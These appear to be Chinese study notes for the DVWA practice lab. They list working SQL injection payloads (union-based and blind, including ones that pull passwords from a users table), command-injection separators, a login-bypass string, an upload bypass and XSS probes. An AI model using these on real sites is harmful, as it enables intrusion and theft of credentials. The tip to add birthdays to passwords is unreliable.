Low：

BF：暴力破解：抓包 试用万能钥匙 admin' or '1'='1 或者 穷举法破解。

CI：命令注入：使用命令符形成命令漏洞 如  ; , | , || , & , && 等等。

CS：跨站请求伪造：通过修改 URL 中的参数。

FI：文件包含漏洞：通过修改 UR了中的参数 读取想要读取的文档。

FU：文件上传漏洞：上传可执行的木马文件。

IC：不安全的验证：本关是在第二步做验证，所以把step改为2就可以绕过验证。

SI：SQL 注入 字符型注入：

判断字段数：1' order by 1# 。

使用联合查询：1' union select 1,2 # 获取回显位置。

在对应位置获取数据库名：1' union select  database(),2 #。

获取数据库所有表名：
1' union select convert(group_concat(table_name) using utf8mb4),2 from information_schema.tables where table_schema=database() #。

获取users字段名：
1' union select convert(group_concat(column_name) using utf8mb4),2 from information_schema.columns where table_name='users' and table_schema=database() # 。
1' union select password,user from users #。

SIBSQL 盲注入：1' and 1=1 。

获取长度：1' and length(database())=x。 

用aascii猜解数据库名：1' and ascii(substr(database(),1,1))=100#。

获取表名：先判断有多少个表：
1' and (select count(table_name) from information_schema.tables where 
table_schema= database())=2 #.

获取第 1 张表名字的第一位字符：
1' and ascii(substr((select table_name from information_schema.tables 
where table_schema=database() limit 0,1),1,1))=103#。

通用：
select table_name from information_schema.tables where table_schema=database() limit 0,1。
select table_name from information_schema.tables where table_schema=database() limit 1,1。
select column_name from information_schema.columns where table_name='users' limit 0,1。
select convert(table_name using utf8mb4) from information_schema.tables where 
table_schema=database() limit 0,1。

XSS：反射型：可更改浏览器 URL 参数 实现 直接输入文本框内进行测试：<script>alert(1)</script>。

XSS：存储型：可更改浏览器 URL 参数 实现 直接输入文本框内进行测试：<script>alert(1)</script>。


Medium：

BF：暴力破解：抓包。

防御手段：
增加密码破解难度：不使用管用的账户密码，如admin,password,123456,root等。
使用高强度密码：如加入生日日期，特殊符号等。

CI：命令注入：使用未被后端过滤的命令符形成命令漏洞：如  ; , | , || , & , && 等等。

FI：文件包含漏洞：可以通过 ip+ 路径包含文件。

FU：文件上传漏洞：通过抓包修改文件后缀形式。

SI：SQL 注入 数字型注入：

在抓包中实现查询。
